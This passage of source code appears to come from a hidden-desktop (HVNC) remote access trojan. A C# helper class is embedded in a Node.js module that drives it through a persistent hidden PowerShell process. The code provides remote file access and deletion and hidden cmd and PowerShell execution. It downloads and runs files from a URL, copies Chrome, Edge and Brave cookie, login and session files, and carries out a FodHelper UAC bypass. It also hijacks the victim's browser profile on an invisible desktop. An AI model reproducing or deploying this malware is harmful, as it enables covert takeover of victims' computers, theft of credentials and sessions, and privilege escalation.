                var encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 90L);
                using (var ms = new MemoryStream()) {
                    bmp.Save(ms, jpegEncoder, encoderParams);
                    File.WriteAllBytes(outputPath, ms.ToArray());
                }
            }
            captureResult = "OK:" + w + "x" + h;
        });
        if (res != null) return res;
        return captureResult ?? "ERROR:No HQ capture result";
    }

    public static string CloseDesktop() {
        if (_hDesktop != IntPtr.Zero) {
            if (_hOrigDesktop != IntPtr.Zero) SetThreadDesktop(_hOrigDesktop);
            CloseDesktop(_hDesktop);
            _hDesktop = IntPtr.Zero;
        }
        return "OK";
    }

    // ═══════════════════════════════════════════════════════════
    // FILE MANAGER
    // ═══════════════════════════════════════════════════════════
    public static string ListDirectory(string dirPath) {
        try {
            if (!Directory.Exists(dirPath)) return "ERROR:Directory not found";
            var entries = new System.Collections.Generic.List<string>();
            foreach (var d in Directory.GetDirectories(dirPath)) {
                var di = new DirectoryInfo(d);
                entries.Add("D|" + di.Name + "|0|" + di.LastWriteTime.ToString("yyyy-MM-dd HH:mm"));
            }
            foreach (var f in Directory.GetFiles(dirPath)) {
                var fi = new FileInfo(f);
                entries.Add("F|" + fi.Name + "|" + fi.Length + "|" + fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm"));
            }
            return "OK:" + string.Join("^^", entries);
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string ReadFileBase64(string filePath, int offset, int chunkSize) {
        try {
            if (!File.Exists(filePath)) return "ERROR:File not found";
            var fi = new FileInfo(filePath);
            if (offset >= fi.Length) return "EOF";
            byte[] buffer = new byte[Math.Min(chunkSize, (int)(fi.Length - offset))];
            using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)) {
                fs.Seek(offset, SeekOrigin.Begin);
                int read = fs.Read(buffer, 0, buffer.Length);
                if (read < buffer.Length) Array.Resize(ref buffer, read);
            }
            return "OK:" + fi.Length + ":" + Convert.ToBase64String(buffer);
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string WriteFileBase64(string filePath, string base64Data, bool append) {
        try {
            byte[] data = Convert.FromBase64String(base64Data);
            if (append && File.Exists(filePath)) {
                using (var fs = new FileStream(filePath, FileMode.Append)) { fs.Write(data, 0, data.Length); }
            } else {
                string dir = Path.GetDirectoryName(filePath);
                if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                File.WriteAllBytes(filePath, data);
            }
            return "OK:" + data.Length;
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string DeletePath(string targetPath) {
        try {
            if (File.Exists(targetPath)) { File.Delete(targetPath); return "OK:file"; }
            if (Directory.Exists(targetPath)) { Directory.Delete(targetPath, true); return "OK:dir"; }
            return "ERROR:Not found";
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string CreateDirectory(string dirPath) {
        try { Directory.CreateDirectory(dirPath); return "OK"; }
        catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string GetFileInfo(string filePath) {
        try {
            if (!File.Exists(filePath)) return "ERROR:Not found";
            var fi = new FileInfo(filePath);
            return "OK:" + fi.Length + "|" + fi.CreationTime.ToString("o") + "|" + fi.LastWriteTime.ToString("o") + "|" + fi.Attributes;
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    // ═══════════════════════════════════════════════════════════
    // WINDOW MANIPULATION (minimize, maximize, resize, move)
    // ═══════════════════════════════════════════════════════════
    [DllImport("user32.dll")]
    static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

    const int SW_MINIMIZE = 6;
    const int SW_MAXIMIZE = 3;
    const int SW_RESTORE = 9;
    const int SW_HIDE = 0;
    const int SW_SHOW = 5;
    const int HWND_TOPMOST = -1;
    const int HWND_NOTOPMOST = -2;
    const uint SWP_NOMOVE = 0x0002;
    const uint SWP_NOSIZE = 0x0001;

    [DllImport("user32.dll")]
    static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

    public static string MinimizeWindow(long hwndValue) {
        string r = null;
        string res = RunOnDesktopThread(delegate {
            ShowWindow(new IntPtr(hwndValue), SW_MINIMIZE);
            r = "OK";
        }, 5000);
        return res ?? r ?? "ERROR";
    }

    public static string MaximizeWindow(long hwndValue) {
        string r = null;
        string res = RunOnDesktopThread(delegate {
            ShowWindow(new IntPtr(hwndValue), SW_MAXIMIZE);
            r = "OK";
        }, 5000);
        return res ?? r ?? "ERROR";
    }

    public static string RestoreWindow(long hwndValue) {
        string r = null;
        string res = RunOnDesktopThread(delegate {
            ShowWindow(new IntPtr(hwndValue), SW_RESTORE);
            r = "OK";
        }, 5000);
        return res ?? r ?? "ERROR";
    }

    public static string ResizeWindow(long hwndValue, int x, int y, int w, int h) {
        string r = null;
        string res = RunOnDesktopThread(delegate {
            MoveWindow(new IntPtr(hwndValue), x, y, w, h, true);
            r = "OK";
        }, 5000);
        return res ?? r ?? "ERROR";
    }

    public static string SetAlwaysOnTop(long hwndValue, bool onTop) {
        string r = null;
        string res = RunOnDesktopThread(delegate {
            IntPtr insertAfter = onTop ? new IntPtr(HWND_TOPMOST) : new IntPtr(HWND_NOTOPMOST);
            SetWindowPos(new IntPtr(hwndValue), insertAfter, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
            r = "OK";
        }, 5000);
        return res ?? r ?? "ERROR";
    }

    // ═══════════════════════════════════════════════════════════
    // SHELL EXECUTION
    // ═══════════════════════════════════════════════════════════
    public static string ExecuteCommand(string command, int timeoutMs) {
        try {
            var psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + command;
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.CreateNoWindow = true;
            psi.WindowStyle = ProcessWindowStyle.Hidden;

            var proc = Process.Start(psi);
            string stdout = proc.StandardOutput.ReadToEnd();
            string stderr = proc.StandardError.ReadToEnd();
            proc.WaitForExit(timeoutMs > 0 ? timeoutMs : 30000);

            string output = stdout;
            if (!string.IsNullOrEmpty(stderr)) output += "\\n[STDERR]" + stderr;
            // Truncate to 32KB for relay transport
            if (output.Length > 32768) output = output.Substring(0, 32768) + "...(truncated)";
            return "OK:" + proc.ExitCode + ":" + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(output));
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string ExecutePowerShell(string script, int timeoutMs) {
        try {
            var psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command " + (char)34 + script + (char)34;
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.CreateNoWindow = true;

            var proc = Process.Start(psi);
            string stdout = proc.StandardOutput.ReadToEnd();
            string stderr = proc.StandardError.ReadToEnd();
            proc.WaitForExit(timeoutMs > 0 ? timeoutMs : 30000);

            string output = stdout;
            if (!string.IsNullOrEmpty(stderr)) output += "\\n[STDERR]" + stderr;
            if (output.Length > 32768) output = output.Substring(0, 32768) + "...(truncated)";
            return "OK:" + proc.ExitCode + ":" + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(output));
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }



    // ═══════════════════════════════════════════════════════════
    // SYSTEM MANAGEMENT
    // ═══════════════════════════════════════════════════════════
    [StructLayout(LayoutKind.Sequential)]
    struct MEMORYSTATUSEX {
        public uint dwLength; public uint dwMemoryLoad;
        public ulong ullTotalPhys; public ulong ullAvailPhys;
        public ulong ullTotalPageFile; public ulong ullAvailPageFile;
        public ulong ullTotalVirtual; public ulong ullAvailVirtual;
        public ulong ullAvailExtendedVirtual;
    }

    [DllImport("kernel32.dll")]
    static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);

    public static string GetSystemInfo() {
        try {
            var p = new System.Collections.Generic.List<string>();
            p.Add("os=" + Environment.OSVersion);
            p.Add("machine=" + Environment.MachineName);
            p.Add("user=" + Environment.UserName);
            p.Add("domain=" + Environment.UserDomainName);
            p.Add("processors=" + Environment.ProcessorCount);
            p.Add("is64bit=" + Environment.Is64BitOperatingSystem);
            p.Add("uptime=" + (Environment.TickCount / 1000));
            p.Add("clrVersion=" + Environment.Version);
            var mem = new MEMORYSTATUSEX();
            mem.dwLength = (uint)Marshal.SizeOf(typeof(MEMORYSTATUSEX));
            if (GlobalMemoryStatusEx(ref mem)) {
                p.Add("totalRAM=" + (mem.ullTotalPhys / (1024*1024)));
                p.Add("freeRAM=" + (mem.ullAvailPhys / (1024*1024)));
                p.Add("memLoad=" + mem.dwMemoryLoad + "%");
            }
            return "OK:" + string.Join("^^", p);
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string IsAdmin() {
        try {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            bool admin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            return "OK:" + admin;
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string GetDriveInfo() {
        try {
            var drives = new System.Collections.Generic.List<string>();
            foreach (var d in DriveInfo.GetDrives()) {
                try {
                    if (d.IsReady) drives.Add(d.Name + "|" + d.DriveType + "|" + (d.TotalSize/(1024*1024)) + "|" + (d.AvailableFreeSpace/(1024*1024)) + "|" + d.DriveFormat);
                } catch { }
            }
            return "OK:" + string.Join("^^", drives);
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string GetNetworkInfo() {
        try {
            var info = new System.Collections.Generic.List<string>();
            foreach (var iface in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()) {
                if (iface.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up) continue;
                var props = iface.GetIPProperties();
                foreach (var addr in props.UnicastAddresses) {
                    if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        info.Add(iface.Name + "|" + addr.Address + "|" + iface.NetworkInterfaceType + "|" + iface.Speed);
                }
            }
            return "OK:" + string.Join("^^", info);
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string GetInstalledPrograms() {
        try {
            var programs = new System.Collections.Generic.List<string>();
            string[] regKeys = { @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" };
            foreach (var rk in regKeys) {
                try {
                    using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(rk)) {
                        if (key == null) continue;
                        foreach (var skn in key.GetSubKeyNames()) {
                            try {
                                using (var sk = key.OpenSubKey(skn)) {
                                    var name = sk.GetValue("DisplayName") as string;
                                    if (!string.IsNullOrEmpty(name)) {
                                        var ver = (sk.GetValue("DisplayVersion") as string) ?? "";
                                        var pub = (sk.GetValue("Publisher") as string) ?? "";
                                        programs.Add(name + "|" + ver + "|" + pub);
                                    }
                                }
                            } catch { }
                        }
                    }
                } catch { }
            }
            if (programs.Count > 200) programs.RemoveRange(200, programs.Count - 200);
            return "OK:" + string.Join("^^", programs);
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }


    public static string CaptureRealDesktop(string outputPath) {
        try {
            int w = GetSystemMetrics(SM_CXSCREEN);
            int h = GetSystemMetrics(SM_CYSCREEN);
            using (var bmp = new Bitmap(w, h)) {
                using (var g = Graphics.FromImage(bmp)) { g.CopyFromScreen(0, 0, 0, 0, new Size(w, h)); }
                var enc = GetEncoder(ImageFormat.Jpeg);
                var ep = new EncoderParameters(1);
                ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 60L);
                bmp.Save(outputPath, enc, ep);
            }
            return "OK:" + w + "x" + h;
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string PowerAction(string action) {
        try {
            string args = "";
            string exe = "shutdown";
            switch (action) {
                case "shutdown": args = "/s /t 0"; break;
                case "restart": args = "/r /t 0"; break;
                case "logoff": args = "/l"; break;
                case "lock": exe = "rundll32.exe"; args = "user32.dll,LockWorkStation"; break;
                case "sleep":
                    exe = "rundll32.exe"; args = "powrprof.dll,SetSuspendState 0,1,0"; break;
                default: return "ERROR:Unknown action";
            }
            Process.Start(new ProcessStartInfo(exe, args) { CreateNoWindow = true, UseShellExecute = false });
            return "OK:" + action;
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string DownloadAndExecute(string url, string filename) {
        try {
            string tempPath = Path.Combine(Path.GetTempPath(), filename);
            using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, tempPath); }
            if (_hDesktop != IntPtr.Zero) return LaunchOnDesktop(tempPath, "");
            Process.Start(new ProcessStartInfo(tempPath) { UseShellExecute = true });
            return "OK:" + tempPath;
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    // ═══════════════════════════════════════════════════════════
    // BROWSER COOKIE EXTRACTION (for injection into HVNC browser)
    // ═══════════════════════════════════════════════════════════
    public static string ExtractBrowserCookies(string browserType) {
        try {
            string cookiePath = "";
            string localState = "";
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            if (browserType == "chrome") {
                cookiePath = Path.Combine(userProfile, "Google", "Chrome", "User Data", "Default", "Network", "Cookies");
                localState = Path.Combine(userProfile, "Google", "Chrome", "User Data", "Local State");
            } else if (browserType == "edge") {
                cookiePath = Path.Combine(userProfile, "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies");
                localState = Path.Combine(userProfile, "Microsoft", "Edge", "User Data", "Local State");
            } else if (browserType == "brave") {
                cookiePath = Path.Combine(userProfile, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies");
                localState = Path.Combine(userProfile, "BraveSoftware", "Brave-Browser", "User Data", "Local State");
            } else {
                return "ERROR:Unknown browser type";
            }
            if (!File.Exists(cookiePath)) return "ERROR:Cookie file not found at " + cookiePath;
            if (!File.Exists(localState)) return "ERROR:Local State not found";
            byte[] cookieBytes;
            using (var fs = new FileStream(cookiePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete)) {
                cookieBytes = new byte[fs.Length];
                fs.Read(cookieBytes, 0, cookieBytes.Length);
            }
            string cookieB64 = Convert.ToBase64String(cookieBytes);
            byte[] lsBytes;
            using (var fs = new FileStream(localState, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete)) {
                lsBytes = new byte[fs.Length];
                fs.Read(lsBytes, 0, lsBytes.Length);
            }
            string lsB64 = Convert.ToBase64String(lsBytes);
            return "OK:" + browserType + ":" + lsB64.Length + ":" + lsB64 + ":" + cookieB64;
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    static void SafeFileCopy(string src, string dst) {
        string dstDir = Path.GetDirectoryName(dst);
        if (!Directory.Exists(dstDir)) Directory.CreateDirectory(dstDir);
        using (var sfs = new FileStream(src, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
        using (var dfs = new FileStream(dst, FileMode.Create, FileAccess.Write)) {
            sfs.CopyTo(dfs);
        }
    }

    public static string CloneBrowserProfile(string sourceBrowser, string targetDir) {
        try {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string sourceBase = "";
            if (sourceBrowser == "chrome") sourceBase = Path.Combine(userProfile, "Google", "Chrome", "User Data");
            else if (sourceBrowser == "edge") sourceBase = Path.Combine(userProfile, "Microsoft", "Edge", "User Data");
            else if (sourceBrowser == "brave") sourceBase = Path.Combine(userProfile, "BraveSoftware", "Brave-Browser", "User Data");
            else return "ERROR:Unknown browser";
            string sourceDir = Path.Combine(sourceBase, "Default");
            if (!Directory.Exists(sourceDir)) return "ERROR:Source profile not found at " + sourceDir;
            if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
            int copied = 0;
            string networkSrc = Path.Combine(sourceDir, "Network");
            string networkDst = Path.Combine(targetDir, "Network");
            string[] profileFiles = { "Cookies", "Login Data", "Web Data", "History", "Bookmarks", "Preferences", "Secure Preferences", "Favicons", "Top Sites", "Visited Links" };
            foreach (var f in profileFiles) {
                try {
                    string src = Path.Combine(sourceDir, f);
                    if (File.Exists(src)) { SafeFileCopy(src, Path.Combine(targetDir, f)); copied++; }
                } catch { }
            }
            string[] networkFiles = { "Cookies", "Cookies-journal" };
            foreach (var f in networkFiles) {
                try {
                    string src = Path.Combine(networkSrc, f);
                    if (File.Exists(src)) { SafeFileCopy(src, Path.Combine(networkDst, f)); copied++; }
                } catch { }
            }
            try {
                string ldj = Path.Combine(sourceDir, "Login Data-journal");
                if (File.Exists(ldj)) { SafeFileCopy(ldj, Path.Combine(targetDir, "Login Data-journal")); copied++; }
            } catch { }
            try {
                string lsPath = Path.Combine(sourceBase, "Local State");
                string lsDst = Path.Combine(targetDir, "..", "Local State");
                if (File.Exists(lsPath)) { SafeFileCopy(lsPath, lsDst); copied++; }
            } catch { }
            try {
                string sessDir = Path.Combine(sourceDir, "Session Storage");
                if (Directory.Exists(sessDir)) {
                    string sessDst = Path.Combine(targetDir, "Session Storage");
                    if (!Directory.Exists(sessDst)) Directory.CreateDirectory(sessDst);
                    foreach (var f in Directory.GetFiles(sessDir)) {
                        try { SafeFileCopy(f, Path.Combine(sessDst, Path.GetFileName(f))); copied++; } catch { }
                    }
                }
            } catch { }
            try {
                string lsDir = Path.Combine(sourceDir, "Local Storage", "leveldb");
                if (Directory.Exists(lsDir)) {
                    string lsDst = Path.Combine(targetDir, "Local Storage", "leveldb");
                    if (!Directory.Exists(lsDst)) Directory.CreateDirectory(lsDst);
                    foreach (var f in Directory.GetFiles(lsDir)) {
                        try { SafeFileCopy(f, Path.Combine(lsDst, Path.GetFileName(f))); copied++; } catch { }
                    }
                }
            } catch { }
            return "OK:" + copied + " files cloned from " + sourceBrowser;
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    // ═══════════════════════════════════════════════════════════
    // UAC BYPASS (FodHelper method)
    // ═══════════════════════════════════════════════════════════
    public static string UACBypass(string command) {
        try {
            string regPath = @"Software\Classes\ms-settings\Shell\Open\command";
            var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(regPath);
            key.SetValue("", command);
            key.SetValue("DelegateExecute", "");
            key.Close();
            var psi = new ProcessStartInfo();
            psi.FileName = @"C:\Windows\System32\fodhelper.exe";
            psi.UseShellExecute = true;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(psi);
            System.Threading.Thread.Sleep(3000);
            try {
                Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false);
            } catch { }
            return "OK:UAC bypass executed";
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string OpenUrl(string url) {
        try {
            Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });
            return "OK";
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string SetRegistryValue(string root, string keyPath, string valueName, string data) {
        try {
            Microsoft.Win32.RegistryKey baseKey = root == "HKLM" ? Microsoft.Win32.Registry.LocalMachine : Microsoft.Win32.Registry.CurrentUser;
            using (var k = baseKey.CreateSubKey(keyPath)) { k.SetValue(valueName, data); }
            return "OK";
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    public static string GetRegistryValue(string root, string keyPath, string valueName) {
        try {
            Microsoft.Win32.RegistryKey baseKey = root == "HKLM" ? Microsoft.Win32.Registry.LocalMachine : Microsoft.Win32.Registry.CurrentUser;
            using (var k = baseKey.OpenSubKey(keyPath)) {
                if (k == null) return "ERROR:Key not found";
                var val = k.GetValue(valueName);
                return val != null ? "OK:" + val.ToString() : "ERROR:Value not found";
            }
        } catch (Exception ex) { return "ERROR:" + ex.Message; }
    }

    static ImageCodecInfo GetEncoder(ImageFormat format) {
        foreach (var codec in ImageCodecInfo.GetImageDecoders()) {
            if (codec.FormatID == format.Guid) return codec;
        }
        return null;
    }
}
`;

// Persistent PowerShell subprocess — holds the desktop handle in memory
var RESULT_DELIMITER = '##317RESULT##';
var _csFilePath = null;
var _stderrBuf = '';

function startPersistentPS() {
  return new Promise(function(resolve) {
    if (_psProcess && _psReady) { resolve(true); return; }

    // Step 1: Write C# code to a temp .cs file (avoids here-string stdin issues)
    _csFilePath = path.join(os.tmpdir(), '317_hvnc_helper.cs');
    try {
      fs.writeFileSync(_csFilePath, HVNC_HELPER_CS);
      console.log('[HVNC] C# helper written to ' + _csFilePath);
    } catch(e) {
      console.error('[HVNC] Failed to write C# file:', e.message);
      resolve(false);
      return;
    }

    // Step 2: Spawn persistent PowerShell
    try {
      _psProcess = childProcess.spawn('powershell.exe', [
        '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', '-'
      ], { windowsHide: true, stdio: ['pipe', 'pipe', 'pipe'] });
    } catch(spawnErr) {
      console.error('[HVNC] Failed to spawn PowerShell:', spawnErr.message);
      resolve(false);
      return;
    }

    _psBuffer = '';
    _psReady = false;
    _stderrBuf = '';

    _psProcess.stdout.on('data', function(chunk) {
      _psBuffer += chunk.toString();
      var delimIdx;
      while ((delimIdx = _psBuffer.indexOf(RESULT_DELIMITER)) >= 0) {
        var result = _psBuffer.substring(0, delimIdx).trim();
        _psBuffer = _psBuffer.substring(delimIdx + RESULT_DELIMITER.length);
        if (_psPending.length > 0) {
          var cb = _psPending.shift();
          cb(result);
        }
      }
    });

    _psProcess.stderr.on('data', function(chunk) {
      _stderrBuf += chunk.toString();
    });
    _psProcess.on('error', function(err) {
      console.error('[HVNC] PS process error:', err.message);
      _psReady = false; _psProcess = null;
      // Resolve any pending callbacks
      while (_psPending.length > 0) { _psPending.shift()(null); }
    });
    _psProcess.on('exit', function(code) {
      if (_stderrBuf) console.error('[HVNC] PS stderr:', _stderrBuf.substring(0, 500));
      console.error('[HVNC] PS process exited with code:', code);
      _psReady = false; _psProcess = null;
      while (_psPending.length > 0) { _psPending.shift()(null); }
    });

    // Step 3: Load C# from file (not here-string — here-strings break via stdin pipe)
    var loadCmd = 'try { Add-Type -Path "' + _csFilePath + '" -ReferencedAssemblies System.Drawing,System.Windows.Forms; Write-Output "LOADED" } catch { Write-Output ("CSERROR:" + $_.Exception.Message) }\n';
    loadCmd += 'Write-Output "' + RESULT_DELIMITER + '"\n';
    _psProcess.stdin.write(loadCmd);

    // Wait for init with timeout
    var initTimeout = setTimeout(function() {
      console.error('[HVNC] PS init timeout (25s). stderr:', _stderrBuf.substring(0, 500));
      try { _psProcess.kill(); } catch(e) {}
      _psProcess = null;
      _psPending = [];
      resolve(false);
    }, 25000);

    _psPending.push(function(result) {
      clearTimeout(initTimeout);
      if (result && result.indexOf('LOADED') >= 0) {
        _psReady = true;
        console.log('[HVNC] Persistent PowerShell ready, C# class loaded');
        resolve(true);
      } else {
        console.error('[HVNC] C# load failed:', result);
        try { _psProcess.kill(); } catch(e) {}
        _psProcess = null;
        resolve(false);
      }
    });
  });
}

function sendPSCommand(command) {
  return new Promise(function(resolve) {
    if (!_psProcess || !_psReady) {
      console.error('[HVNC] PS not ready, command skipped');
      resolve(null);
      return;
    }
    var timeout = setTimeout(function() {
      var idx = _psPending.indexOf(cb);
      if (idx >= 0) _psPending.splice(idx, 1);
      console.error('[HVNC] Command timeout (30s)');
      resolve(null);
    }, 30000);
    function cb(result) {
      clearTimeout(timeout);
      resolve(result);
    }
    _psPending.push(cb);
    // Wrap in try-catch so errors don't prevent delimiter from being written
    var wrappedCmd = 'try { ' + command + ' } catch { Write-Output ("ERROR:" + $_.Exception.Message) }\n';
    wrappedCmd += 'Write-Output "' + RESULT_DELIMITER + '"\n';
    _psProcess.stdin.write(wrappedCmd);
  });
}

function killPersistentPS() {
  if (_psProcess) {
    try { _psProcess.stdin.write('exit\n'); } catch(e) {}
    setTimeout(function() {
      try { if (_psProcess) _psProcess.kill(); } catch(e) {}
    }, 1000);
    _psProcess = null;
    _psReady = false;
    _psPending = [];
  }
}

// Create the hidden desktop
async function createHiddenDesktop() {
  if (_hvncDesktopCreated) return true;

  console.log('[HVNC] Starting persistent PowerShell...');
  var started = await startPersistentPS();
  if (!started) {
    console.error('[HVNC] Failed to start persistent PowerShell');
    return false;
  }

  console.log('[HVNC] Creating hidden desktop:', HVNC_DESKTOP_NAME);
  var result = await sendPSCommand('$r = [HVNCHelper]::CreateHiddenDesktop("' + HVNC_DESKTOP_NAME + '"); Write-Output $r');
  console.log('[HVNC] CreateHiddenDesktop result:', result);
  if (result && result.indexOf('OK:') === 0) {
    _hvncDesktopCreated = true;
    // Note: Explorer shell is NOT auto-launched because explorer.exe has
    // Windows singleton behavior that causes it to open on the REAL desktop.
    // Users can launch apps manually from the HVNC panel buttons.
    return true;
  }
  console.error('[HVNC] Failed to create desktop:', result);
  return false;
}

// Launch application on hidden desktop
async function launchOnDesktop(appPath, args) {
  if (!_hvncDesktopCreated) { console.error('[HVNC] Cannot launch - no desktop'); return null; }

  var lowerPath = String(appPath).toLowerCase();

  // Kill browser + use ORIGINAL profile path (cookies work with same encryption context)
  if (lowerPath.indexOf('chrome.exe') !== -1 || lowerPath.indexOf('msedge.exe') !== -1 || lowerPath.indexOf('brave.exe') !== -1) {
    var browserName = lowerPath.indexOf('chrome.exe') !== -1 ? 'chrome' : (lowerPath.indexOf('msedge.exe') !== -1 ? 'edge' : 'brave');
    var originalDir = '';
    var localAppData = process.env.LOCALAPPDATA || '';
    if (browserName === 'chrome') originalDir = path.join(localAppData, 'Google', 'Chrome', 'User Data');
    else if (browserName === 'edge') originalDir = path.join(localAppData, 'Microsoft', 'Edge', 'User Data');
    else if (browserName === 'brave') originalDir = path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data');
    try {
      var cp = require('child_process');
      var procName = browserName === 'edge' ? 'msedge' : browserName;
      var psLines = [
        '$ErrorActionPreference="SilentlyContinue"',
        '$procs=Get-Process -Name "' + procName + '" -ErrorAction SilentlyContinue',
        'if($procs){$procs|Stop-Process -Force;Start-Sleep -Milliseconds 800}',
        '$ud="' + originalDir + '"',
        '@("SingletonLock","SingletonSocket","SingletonCookie","lockfile")|ForEach-Object{Remove-Item (Join-Path $ud $_) -Force -ErrorAction SilentlyContinue}',
        'Write-Output "READY"',
      ];
      var psScript = psLines.join('\n');
      var psBase64 = Buffer.from(psScript, 'utf16le').toString('base64');
      var killResult = cp.execSync('powershell.exe -NoProfile -NonInteractive -EncodedCommand ' + psBase64, { timeout: 15000, encoding: 'utf8' });
      console.log('[HVNC] Browser prep:', killResult.match(/READY/) ? 'OK - killed, locks removed' : killResult.trim().substring(0, 80));
    } catch(e) { console.log('[HVNC] Browser prep error:', e.message); }
    args = String(args || '') + ' --user-data-dir="' + originalDir + '" --no-first-run --no-default-browser-check --disable-session-crashed-bubble --hide-crash-restore-bubble --disable-infobars --disable-popup-blocking';
  } else if (lowerPath.indexOf('explorer.exe') !== -1) {
    if (!args || String(args).trim() === '') args = '/e,C:\\';
  }

  // PowerShell escape: backtick is escape char, NOT backslash. Escape $, `, and "
  var safePath = String(appPath).replace(/`/g, '``').replace(/\$/g, '`$').replace(/"/g, '`"');
  var safeArgs = String(args || '').replace(/`/g, '``').replace(/\$/g, '`$').replace(/"/g, '`"');
  var result = await sendPSCommand('$r = [HVNCHelper]::LaunchOnDesktop("' + safePath + '", "' + safeArgs + '"); Write-Output $r');
  console.log('[HVNC] LaunchOnDesktop result:', result);
  if (result && result.indexOf('OK:') === 0) {
    var pid = parseInt(result.split(':')[1]);
    _hvncProcesses.push(pid);
    return pid;
  }
  return null;
}

// Capture hidden desktop screenshot — fast file-based approach
var _captureLogCount = 0;
var _captureLoopStarted = false;
var _captureDir = path.join(os.tmpdir(), '317_hvnc_caps');
var _lastSignal = '';
// Pre-compute paths once (avoid path.join overhead per frame)
var _signalPath = path.join(_captureDir, 'frame_ready.txt');
var _framePathA = path.join(_captureDir, 'frame_a.jpg');
var _framePathB = path.join(_captureDir, 'frame_b.jpg');

async function startCaptureLoop() {
  if (_captureLoopStarted) return true;
  try { fs.mkdirSync(_captureDir, { recursive: true }); } catch(e) {}
  var escapedDir = _captureDir.replace(/\\/g, '\\\\');
  var result = await sendPSCommand("$r = [HVNCHelper]::StartCaptureLoop('" + escapedDir + "'); Write-Output $r");
  console.log('[HVNC] StartCaptureLoop result:', result);
  if (result && result.indexOf('OK:') === 0) {
    _captureLoopStarted = true;
    return true;
  }
  return false;
}

async function captureHiddenDesktop() {
  if (!_hvncDesktopCreated) { if (_captureLogCount < 3) console.error('[HVNC] Capture called but no desktop'); return null; }

  // Start fast capture loop if not running
  if (!_captureLoopStarted) {
    var ok = await startCaptureLoop();
    if (!ok) {
      console.error('[HVNC] Failed to start capture loop');
      return _hvncLastFrame || null;
    }
    await new Promise(function(r) { setTimeout(r, 150); });
  }

  _captureLogCount++;

  try {
    var signal = fs.readFileSync(_signalPath, 'utf8').trim();
    if (signal === _lastSignal) {
      return null; // No new frame — skip sending duplicate
    }
    _lastSignal = signal;
    var framePath = signal.charCodeAt(0) === 65 ? _framePathA : _framePathB; // 'A' = 65
    var buf = fs.readFileSync(framePath);
    if (_captureLogCount <= 3) console.log('[HVNC] Frame size:', buf.length, 'bytes');
    if (buf.length > 100) {
      _hvncLastFrame = buf;
      return buf;
    }
  } catch(e) {
    if (_captureLogCount <= 5) console.log('[HVNC] Frame read pending...', e.code || e.message);
  }
  return null;
}

// Capture HQ screenshot of hidden desktop
async function captureHiddenDesktopHQ() {
  if (!_hvncDesktopCreated) return null;
  try {
